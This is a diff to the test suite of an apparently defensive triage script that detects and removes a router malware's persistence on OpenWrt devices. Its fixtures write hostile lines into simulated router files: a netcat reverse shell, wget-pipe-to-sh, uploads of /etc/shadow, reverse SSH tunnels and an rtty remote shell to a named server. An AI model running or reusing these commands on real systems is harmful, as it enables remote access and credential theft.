@@ -657,6 +657,50 @@ run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
 expect "--fix leaves a firewall.user that would break without the line, and says so (exit $rc)" '[ $rc = 3 ] && grep -q "if wget" "$D/m/etc/firewall.user" && grep -q "left /etc/firewall.user: without the malware.s lines it would no longer run as a script" "$D/fix.txt"'
 umount "$D/m"
 
+echo "=== a check of a block, a count, delete before insert, an ipset; uploads, redirects, a commented \\ (third review of 2.53)"
+# The owner's checks: wget -qO- into /dev/null, a count of the malware's files with $( ),
+# rules deleted before they are added again, an ipset of the older backdoor's names.
+D=$(mkscen checks "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
+printf '/root/start-vpn.sh\nPID=$(pidof gl-helper) && kill $PID\niptables -I OUTPUT -d 65.20.71.131 -j DROP\nexit 0\n' >"$U/etc/rc.local"
+printf '0 4 * * * /root/backup.sh\n*/30 * * * * wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa "block failed"\n*/20 * * * * uclient-fetch -q -O - http://gl-inet.top/ >/dev/null || logger -t csa ok\n' >"$U/etc/crontabs/root"
+printf '#!/bin/sh\nn=$(ls /etc/config/.gl/ 2>/dev/null | wc -l)\n[ "$n" -gt 0 ] && logger -t csa ALERT\n' >"$U/etc/hotplug.d/iface/99-count"
+printf '#!/bin/sh\niptables -D FORWARD -d openwrt-project.org -j DROP 2>/dev/null\niptables -I FORWARD -d openwrt-project.org -j DROP\niptables -D OUTPUT -d 65.20.71.131 -j DROP 2>/dev/null\niptables -I OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/hotplug.d/iface/99-block"
+printf "config dnsmasq\n\tlist ipset '/adguardns.com/adguardns.org/openwrt-project.org/bdblock'\n" >"$U/etc/config/dhcp"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
+expect "pidof in \$( ) and ls in \$( ) only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-count" "$D/check.txt"'
+expect "wget -qO- and uclient-fetch -O - into /dev/null are probes" 'grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it"'
+expect "delete before insert is a block, for the malware and for the older backdoor" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hotplug.d/iface/99-block" "$D/check.txt"'
+expect "an ipset of the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/dhcp" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "start-vpn" "$D/m/etc/rc.local" && grep -q "pidof" "$D/m/etc/rc.local" && grep -q "wget -qO-" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-count" ] && [ -f "$D/m/etc/hotplug.d/iface/99-block" ]'
+umount "$D/m"
+
+# A channel or download with its output in /dev/null, an upload, a commented \ that would
+# hide the next line, and paths behind /usr/bin/nohup, timeout, sh -s < and cd.
+D=$(mkscen hidden "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d" "$U/etc/udhcpc.user.d"
+printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252 >/dev/null 2>&1; }\n' >"$U/etc/init.d/tun"
+printf '#!/bin/sh\ncd /tmp && wget -q http://65.20.71.131:8000/gb >/dev/null 2>&1; chmod +x /tmp/gb; /tmp/gb &\n' >"$U/etc/hotplug.d/iface/99-gb"
+printf '#!/bin/sh\nnc 65.20.71.131 8000 -e /bin/sh 2>/dev/null\n' >"$U/etc/hotplug.d/iface/99-nc"
+printf '#!/bin/sh\ncurl -s -o /dev/null -d "id=$(cat /etc/machine-id)" http://65.20.71.131:8000/r\n' >"$U/etc/hotplug.d/iface/99-ping"
+printf '#!/bin/sh\nwget -q -O /dev/null --post-file=/etc/shadow http://gl-inet.top:8899/u\n' >"$U/etc/uci-defaults/99-up"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n  logger -t net up  # wait for wan \\\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\n}\n' >"$U/etc/init.d/netcheck"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n  timeout -s KILL 60 /etc/config/.gl/gl-helper &\n}\n' >"$U/etc/init.d/zz-t"
+printf 'sh -s < /etc/config/.gl/run.sh\n' >"$U/etc/profile.d/zz.sh"
+printf '#!/bin/sh\ncd /etc/config/.gl/ && ./gb &\n' >"$U/etc/udhcpc.user.d/zz"
+printf '*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a >/dev/null 2>&1\n' >"$U/etc/crontabs/root"
+printf '/root/start-vpn.sh  # \\\n/usr/bin/nohup /etc/glinet/.cache/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/init.d/tun /etc/hotplug.d/iface/99-gb /etc/hotplug.d/iface/99-nc /etc/hotplug.d/iface/99-ping /etc/uci-defaults/99-up /etc/init.d/netcheck /etc/init.d/zz-t /etc/profile.d/zz.sh /etc/udhcpc.user.d/zz /etc/crontabs/root /etc/rc.local; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
+expect "the line behind a commented \\ is read on its own" 'grep -A1 "IOC  *persist-ref  */etc/init.d/netcheck" "$D/check.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix removes them (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/init.d/tun" ] && [ ! -e "$D/m/etc/init.d/netcheck" ] && [ ! -e "$D/m/etc/hotplug.d/iface/99-ping" ] && [ ! -e "$D/m/etc/uci-defaults/99-up" ] && ! grep -q gl-helper "$D/m/etc/rc.local"'
+umount "$D/m"
+
 echo "=== a deleted rc.local, a failed archive, a run from a pipe"
 D=$(mkscen wo "$OWL"); U=$D/u
 mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gb"
@@ -909,6 +953,16 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	expect "a loop around the malware, dbclient, a program from /tmp and one named like this script are IOC" '(for n in 5021 5022 5023 5024; do grep -q "IOC  *process  *$n" "$L/procs3.txt" || exit 1; done)'
 	expect "a probe and a block taken away are REVIEW; this script from cron is skipped" 'grep -q "REVIEW  *process  *5025" "$L/procs3.txt" && grep -q "REVIEW  *process  *5026" "$L/procs3.txt" && ! grep -q "INFO  *process  *5026" "$L/procs3.txt" && ! grep -q "process  *5027" "$L/procs3.txt"'
 	rm -r "$L"/proc/502? "$L/tmp/self"; rm -f "$L/tmp/gl-helper-triage.sh" "$L/tmp/gb"
+	# pidof in $( ), an upload into /dev/null, a check of a block, timeout, a newline in sh -c
+	# (third review of 2.53)
+	fp 5031 sh 'sh\0-c\0PID=$(pidof gl-helper); [ -n "$PID" ] && logger running\0'
+	fp 5032 curl 'curl\0-s\0-o\0/dev/null\0-d\0@/etc/shadow\0http://65.20.71.131:8000/up\0'
+	fp 5033 sh 'sh\0-c\0wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa down\0'
+	fp 5034 sh 'sh\0-c\0timeout -s KILL 60 /etc/config/.gl/gl-helper\0'
+	fp 5035 sh 'sh\0-c\0sleep 5\n/etc/glinet/.cache/gl-helper\0'
+	live --no-report >"$L/procs4.txt"
+	expect "pidof in \$( ) and a check of a block are REVIEW; an upload, timeout and a second line are IOC" 'grep -q "REVIEW  *process  *5031" "$L/procs4.txt" && grep -q "REVIEW  *process  *5033" "$L/procs4.txt" && ! grep -qE "IOC  *process  *503[13]" "$L/procs4.txt" && (for n in 5032 5034 5035; do grep -q "IOC  *process  *$n" "$L/procs4.txt" || exit 1; done)'
+	rm -r "$L"/proc/503?
 	# The report keeps the owner's lines and names, and says so in bold before it asks
 	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\niptables -I FORWARD -s 192.168.8.60 -d 65.20.71.131 -j DROP\niptables -t nat -A PREROUTING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1\nexit 0\n' >"$L/etc/rc.local"
 	{ printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n'; for n in 1 2 3 4 5 6 7 8; do printf 'zz%s:x:0:0::/root:/bin/ash\n' "$n"; done; } >"$L/etc/passwd"
